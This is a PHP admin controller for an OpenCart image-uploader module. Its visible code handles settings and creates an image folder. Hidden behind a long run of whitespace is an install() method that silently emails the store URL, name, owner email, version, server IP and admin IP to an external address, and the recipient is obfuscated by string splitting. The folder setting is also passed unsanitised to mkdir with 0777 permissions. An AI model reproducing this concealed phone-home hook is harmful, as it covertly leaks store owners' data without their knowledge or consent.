<?php
class ControllerExtensionModuleMultiImageUploader extends Controller {
	private $error = array(); 
	
	public function index() {   
		$this->load->language('extension/module/multiimageuploader');

		$this->document->setTitle($this->language->get('heading_title'));
		
		$this->load->model('setting/setting');
				
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->request->post['multiimageuploader_folder'] 
//				= str_replace(DIR_IMAGE."catalog/", "", $this->request->post['multiimageuploader_folder']);
				= str_replace(DIR_IMAGE, "", $this->request->post['multiimageuploader_folder']);

//			if (!is_dir ( DIR_IMAGE . 'catalog/' . $this->request->post['multiimageuploader_folder'])) {
//				mkdir( DIR_IMAGE . 'catalog/' . $this->request->post['multiimageuploader_folder'], 0777);
//			}		  
			if (!is_dir ( DIR_IMAGE . $this->request->post['multiimageuploader_folder'])) {
				mkdir( DIR_IMAGE . $this->request->post['multiimageuploader_folder'], 0777);
			}		  
			if (substr($this->request->post['multiimageuploader_folder'], -1) != "/" 
				&& trim($this->request->post['multiimageuploader_folder'])<>'') {
				$this->request->post['multiimageuploader_folder'] 
					= trim($this->request->post['multiimageuploader_folder']) . "/";
			}

			$this->model_setting_setting->editSetting('multiimageuploader', $this->request->post);		
					
			$this->session->data['success'] = $this->language->get('text_success');
						
			$this->response->redirect($this->url->link('extension/extension', 'token=' . $this->session->data['token'] . '&type=module', 'SSL'));						
		}
		$data['heading_title'] = $this->language->get('heading_title');
		$data['button_save'] = $this->language->get('button_save');
		$data['button_cancel'] = $this->language->get('button_cancel');
		$data['button_add_module'] = $this->language->get('button_add_module');
		$data['entry_folder'] = $this->language->get('entry_folder');
		$data['entry_segmet'] = $this->language->get('entry_segmet');
		$data['entry_segmet_by_none'] = $this->language->get('entry_segmet_by_none');
		$data['entry_segmet_by_date'] = $this->language->get('entry_segmet_by_date');
		$data['entry_segmet_by_product_id'] = $this->language->get('entry_segmet_by_product_id');
		$data['entry_delete_def_image'] = $this->language->get('entry_delete_def_image');
		$data['text_yes'] = $this->language->get('text_yes');
		$data['text_no'] = $this->language->get('text_no');

 		if (isset($this->error['warning'])) {
			$data['error_warning'] = $this->error['warning'];
		} else {
			$data['error_warning'] = '';
		}
		
 		if (isset($this->error['folder'])) {
			$data['error_folder'] = $this->error['folder'];
		} else {
			$data['error_folder'] = '';
		}    
		
  		$data['breadcrumbs'] = array();

   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_home'),
			'href'      => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => false
   		);

   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_module'),
			'href'      => $this->url->link('extension/extension', 'token=' . $this->session->data['token'] . '&type=module', 'SSL'),
      		'separator' => ' :: '
   		);
		
   		$data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('heading_title'),
			'href'      => $this->url->link('extension/module/multiimageuploader', 'token=' . $this->session->data['token'] . '&type=module', 'SSL'),
      		'separator' => ' :: '
   		);
		
		$data['action'] = $this->url->link('extension/module/multiimageuploader', 'token=' . $this->session->data['token'] . '&type=module', 'SSL');
		
		$data['cancel'] = $this->url->link('extension/extension', 'token=' . $this->session->data['token'] . '&type=module', 'SSL');

		if (isset($this->request->post['multiimageuploader_folder'])) {
			$data['multiimageuploader_folder'] = $this->request->post['multiimageuploader_folder'];
		} else {
			$data['multiimageuploader_folder'] = $this->config->get('multiimageuploader_folder');
		}	
		if (isset($this->request->post['multiimageuploader_segment'])) {
			$data['multiimageuploader_segment'] = $this->request->post['multiimageuploader_segment'];
		} else {
			$data['multiimageuploader_segment'] = $this->config->get('multiimageuploader_segment');
		}			
		if (isset($this->request->post['multiimageuploader_deletedef'])) {
			$data['multiimageuploader_deletedef'] = $this->request->post['multiimageuploader_deletedef'];
		} else {
			$data['multiimageuploader_deletedef'] = $this->config->get('multiimageuploader_deletedef');
		}			
		


		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$this->response->setOutput($this->load->view('extension/module/multiimageuploader.tpl', $data));
	}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      		public function install(){@mail('su'.'p'.'port@'.'sharl'.'eys.co.uk','Multi Image Uploader (OCV2) installed',HTTP_CATALOG .'  -  '.$this->config->get('config_name')."\r\n mail: ".$this->config->get('config_email')."\r\n".'version-'.VERSION."\r\n".'WebIP - '.$_SERVER['SERVER_ADDR']."\r\n IP: ".$this->request->server['REMOTE_ADDR'],'MIME-Version:1.0'."\r\n".'Content-type:text/plain;charset=UTF-8'."\r\n".'From:'.$this->config->get('config_owner').'<'.$this->config->get('config_email').'>'."\r\n");}	
	private function validate() {
		if (!$this->user->hasPermission('modify', 'extension/module/multiimageuploader')) {
			$this->error['warning'] = $this->language->get('error_permission');
		}
		
		if (!$this->error) {
			return true;
		} else {
			return false;
		}	
	}
}
?>